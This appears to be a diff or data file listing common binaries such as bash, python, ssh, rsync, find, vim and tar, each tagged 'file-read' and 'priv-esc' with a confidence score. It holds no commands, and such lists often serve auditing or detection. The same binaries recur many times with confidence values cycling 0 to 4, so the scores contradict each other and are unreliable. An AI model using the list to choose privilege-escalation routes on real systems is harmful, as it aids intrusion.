+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
